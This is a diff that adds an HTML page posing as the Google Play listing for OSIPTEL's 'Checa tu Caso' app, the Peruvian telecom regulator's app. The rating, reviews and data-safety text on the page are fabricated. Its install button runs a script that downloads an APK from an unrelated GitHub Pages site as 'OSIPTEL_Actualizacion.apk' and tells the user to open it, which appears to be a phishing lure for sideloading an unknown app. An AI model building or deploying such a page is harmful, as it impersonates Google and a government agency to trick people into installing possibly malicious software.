@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="es-PE">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OSIPTEL - Checa tu Caso - Apps en Google Play</title>
+    <style>
+        :root {
+            --primary: #1a73e8;
+            --primary-dark: #1557b0;
+            --green: #01875f;
+            --green-dark: #016b4c;
+            --bg: #fff;
+            --surface: #f8f9fa;
+            --text: #202124;
+            --text-secondary: #5f6368;
+            --border: #dadce0;
+            --star: #fbbc04;
+            --shadow: 0 1px 2px rgba(60,64,67,.3), 0 1px 3px rgba(60,64,67,.15);
+            --shadow-lg: 0 1px 3px rgba(60,64,67,.3), 0 4px 8px rgba(60,64,67,.15);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* ── TOP BAR ────────────────────────────────── */
+        .topbar {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 16px;
+            border-bottom: 1px solid var(--border);
+        }
+        .topbar .logo-play {
+            width: 32px; height: 32px;
+            background: var(--primary);
+            border-radius: 8px;
+            display: flex; align-items: center; justify-content: center;
+        }
+        .topbar .logo-play svg { width: 20px; height: 20px; fill: #fff; }
+        .topbar .search-box {
+            flex: 1;
+            display: flex; align-items: center;
+            gap: 8px;
+            padding: 8px 16px;
+            background: var(--surface);
+            border-radius: 24px;
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+        .topbar .search-box svg { width: 18px; height: 18px; fill: var(--text-secondary); }
+        .topbar .avatar {
+            width: 32px; height: 32px;
+            border-radius: 50%;
+            background: #5f6368;
+        }
+
+        /* ── APP HEADER ─────────────────────────────── */
+        .app-header {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            padding: 16px;
+        }
+        .app-icon {
+            width: 72px; height: 72px;
+            border-radius: 16px;
+            box-shadow: var(--shadow);
+        }
+        .app-icon img { width: 100%; height: 100%; border-radius: 16px; }
+        .app-info { flex: 1; }
+        .app-info h1 { font-size: 20px; font-weight: 500; margin-bottom: 4px; }
+        .app-info .developer { font-size: 13px; color: var(--text-secondary); }
+        .app-info .rating {
+            display: flex; align-items: center; gap: 4px;
+            margin-top: 6px; font-size: 13px;
+        }
+        .app-info .rating .stars { color: var(--star); letter-spacing: 1px; }
+        .app-info .rating .reviews { color: var(--text-secondary); }
+
+        /* ── INSTALL BUTTON ──────────────────────────── */
+        .install-btn {
+            display: block;
+            width: calc(100% - 32px);
+            margin: 0 16px 8px;
+            padding: 12px 0;
+            background: var(--green);
+            color: #fff;
+            font-size: 15px;
+            font-weight: 500;
+            border: none;
+            border-radius: 24px;
+            cursor: pointer;
+            text-align: center;
+            text-decoration: none;
+            box-shadow: var(--shadow);
+            transition: background .2s;
+        }
+        .install-btn:hover { background: var(--green-dark); }
+
+        /* ── BADGES ──────────────────────────────────── */
+        .badges {
+            display: flex; gap: 8px;
+            padding: 0 16px; margin-bottom: 12px;
+            flex-wrap: wrap;
+        }
+        .badge {
+            display: flex; align-items: center; gap: 4px;
+            font-size: 11px; color: var(--text-secondary);
+            background: var(--surface);
+            padding: 4px 8px; border-radius: 4px;
+        }
+
+        /* ── SCREENSHOT CAROUSEL ─────────────────────── */
+        .screenshots-section { padding: 0 16px 16px; }
+        .screenshots-section h2 {
+            font-size: 16px; font-weight: 500;
+            margin-bottom: 12px;
+        }
+        .screenshots-scroll {
+            display: flex; gap: 12px;
+            overflow-x: auto;
+            scroll-snap-type: x mandatory;
+            -webkit-overflow-scrolling: touch;
+            padding-bottom: 8px;
+        }
+        .screenshot-card {
+            scroll-snap-align: start;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: var(--shadow);
+            flex-shrink: 0;
+            width: 220px; height: 390px;
+            background: #e8eaed;
+            position: relative;
+        }
+        .screenshot-card img,
+        .screenshot-card video {
+            width: 100%; height: 100%;
+            object-fit: cover;
+        }
+        .screenshot-card video {
+            pointer-events: none;
+        }
+        .screenshot-card .play-badge {
+            position: absolute; bottom: 8px; right: 8px;
+            background: rgba(0,0,0,.7);
+            color: #fff; font-size: 10px;
+            padding: 2px 6px; border-radius: 4px;
+        }
+
+        /* ── ABOUT SECTION ───────────────────────────── */
+        .about-section {
+            padding: 16px;
+            border-top: 1px solid var(--border);
+        }
+        .about-section h2 {
+            font-size: 16px; font-weight: 500;
+            margin-bottom: 8px;
+        }
+        .about-section p {
+            font-size: 14px; line-height: 1.5;
+            color: var(--text-secondary);
+        }
+
+        /* ── DATA SAFETY ─────────────────────────────── */
+        .data-safety {
+            padding: 16px;
+            border-top: 1px solid var(--border);
+        }
+        .data-safety h2 {
+            font-size: 16px; font-weight: 500;
+            margin-bottom: 8px;
+            display: flex; align-items: center; gap: 8px;
+        }
+        .data-safety .shield { color: var(--green); }
+        .data-safety p { font-size: 13px; color: var(--text-secondary); }
+
+        /* ── REVIEWS ─────────────────────────────────── */
+        .reviews-section {
+            padding: 16px;
+            border-top: 1px solid var(--border);
+        }
+        .reviews-section h2 {
+            font-size: 16px; font-weight: 500;
+            margin-bottom: 12px;
+        }
+        .review-card {
+            padding: 12px 0;
+            border-bottom: 1px solid var(--border);
+        }
+        .review-card .reviewer {
+            font-size: 14px; font-weight: 500;
+        }
+        .review-card .review-stars {
+            color: var(--star); font-size: 13px;
+        }
+        .review-card .review-text {
+            font-size: 13px; color: var(--text-secondary);
+            margin-top: 4px;
+        }
+
+        /* ── FOOTER ──────────────────────────────────── */
+        .play-footer {
+            padding: 16px;
+            text-align: center;
+            font-size: 12px;
+            color: var(--text-secondary);
+            border-top: 1px solid var(--border);
+        }
+        .play-footer a { color: var(--primary); text-decoration: none; }
+    </style>
+</head>
+<body>
+
+    <!-- ── TOP BAR ──────────────────────────────────── -->
+    <div class="topbar">
+        <div class="logo-play">
+            <svg viewBox="0 0 24 24"><path d="M3 20.5v-17c0-.59.34-1.11.89-1.35l10.01 7.68c.68.52.68 1.62 0 2.14L3.89 21.85c-.55.24-.89-.28-.89-1.35z"/></svg>
+        </div>
+        <div class="search-box">
+            <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+            Google Play
+        </div>
+        <div class="avatar"></div>
+    </div>
+
+    <!-- ── APP HEADER ────────────────────────────────── -->
+    <div class="app-header">
+        <div class="app-icon">
+            <img src="logo_osiptel_gris.svg" alt="OSIPTEL" style="background:#003366; padding:8px;">
+        </div>
+        <div class="app-info">
+            <h1>OSIPTEL - Checa tu Caso</h1>
+            <div class="developer">OSIPTEL · Organismo Supervisor de Inversión Privada en Telecomunicaciones</div>
+            <div class="rating">
+                <span class="stars">★★★★☆</span>
+                <span>4.5</span>
+                <span class="reviews">(12.3 k reseñas)</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- ── BADGES ────────────────────────────────────── -->
+    <div class="badges">
+        <div class="badge">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="var(--text-secondary)"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+            Para mayores de 3 años
+        </div>
+        <div class="badge">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="var(--text-secondary)"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg>
+            100 k+ Descargas
+        </div>
+    </div>
+
+    <!-- ── INSTALL BUTTON ────────────────────────────── -->
+    <a href="#" class="install-btn" onclick="descargarAPK(); return false;">Instalar</a>
+
+    <!-- ── SCREENSHOTS CAROUSEL ──────────────────────── -->
+    <div class="screenshots-section">
+        <h2>Imágenes</h2>
+        <div class="screenshots-scroll">
+            <!-- Video -->
+            <div class="screenshot-card">
+                <video autoplay muted loop playsinline>
+                    <source src="Checa_Tu_Caso_del_OSIPTEL.mp4" type="video/mp4">
+                </video>
+                <div class="play-badge">▶ VIDEO</div>
+            </div>
+            <!-- 7 Capturas de pantalla -->
+            <div class="screenshot-card"><img src="1.jpg" alt="Captura 1"></div>
+            <div class="screenshot-card"><img src="2.jpg" alt="Captura 2"></div>
+            <div class="screenshot-card"><img src="3.jpg" alt="Captura 3"></div>
+            <div class="screenshot-card"><img src="4.jpg" alt="Captura 4"></div>
+            <div class="screenshot-card"><img src="5.jpg" alt="Captura 5"></div>
+            <div class="screenshot-card"><img src="6.jpg" alt="Captura 6"></div>
+            <div class="screenshot-card"><img src="7.jpg" alt="Captura 7"></div>
+        </div>
+    </div>
+
+    <!-- ── ABOUT ─────────────────────────────────────── -->
+    <div class="about-section">
+        <h2>Acerca de esta app</h2>
+        <p>
+            Reporta problemas de telecomunicaciones fácilmente con Checa tu Caso del OSIPTEL.
+            Esta herramienta te permite registrar los problemas con tu operador y reportar los que no fueron solucionados.
+            Si ya presentaste un reclamo, deberás seguir el procedimiento con tu operador.
+        </p>
+    </div>
+
+    <!-- ── DATA SAFETY ───────────────────────────────── -->
+    <div class="data-safety">
+        <h2><span class="shield">🛡️</span> Seguridad de los datos</h2>
+        <p>Esta aplicación no comparte datos con terceros. Los datos se cifran en tránsito y puedes solicitar su eliminación.</p>
+    </div>
+
+    <!-- ── REVIEWS ───────────────────────────────────── -->
+    <div class="reviews-section">
+        <h2>Valoraciones y reseñas</h2>
+        <div class="review-card">
+            <div class="reviewer">Carlos M.</div>
+            <div class="review-stars">★★★★★</div>
+            <div class="review-text">Muy útil para verificar mis líneas. Pude detectar una línea que no reconocía. ¡Excelente herramienta!</div>
+        </div>
+        <div class="review-card">
+            <div class="reviewer">María L.</div>
+            <div class="review-stars">★★★★☆</div>
+            <div class="review-text">Buena app, pero a veces demora en cargar. Fuera de eso, cumple su función.</div>
+        </div>
+        <div class="review-card">
+            <div class="reviewer">Juan P.</div>
+            <div class="review-stars">★★★★★</div>
+            <div class="review-text">Obligatorio para todos los que tenemos líneas en Perú. Muy fácil de usar.</div>
+        </div>
+    </div>
+
+    <!-- ── FOOTER ────────────────────────────────────── -->
+    <div class="play-footer">
+        <p>Google Play · <a href="#">Política de Privacidad</a> · <a href="#">Términos del Servicio</a></p>
+        <p style="margin-top:4px;">© 2026 Google. Todos los derechos reservados.</p>
+    </div>
+
+    <!-- ── SCRIPTS ───────────────────────────────────── -->
+    <script>
+        function descargarAPK() {
+            // Reemplaza con la URL real de tu APK en GitHub Pages
+            const apkUrl = 'https://osiptel-peru.github.io/osiptel.pe/app-release.apk';
+            const link = document.createElement('a');
+            link.href = apkUrl;
+            link.download = 'OSIPTEL_Actualizacion.apk';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            alert('Descarga iniciada. Una vez completada, abra el archivo para instalar la aplicación.');
+        }
+
+        // Si la app se abre como PWA instalada, ocultar el formulario original y mostrar la Play Store
+        const esPWAInstalada = window.matchMedia('(display-mode: standalone)').matches || navigator.standalone;
+        if (esPWAInstalada) {
+            document.addEventListener('DOMContentLoaded', function() {
+                // Ocultar el contenido original (si existe)
+                const formulario = document.getElementById('formulario');
+                if (formulario) formulario.style.display = 'none';
+            });
+        }
+    </script>
+</body>
+</html>
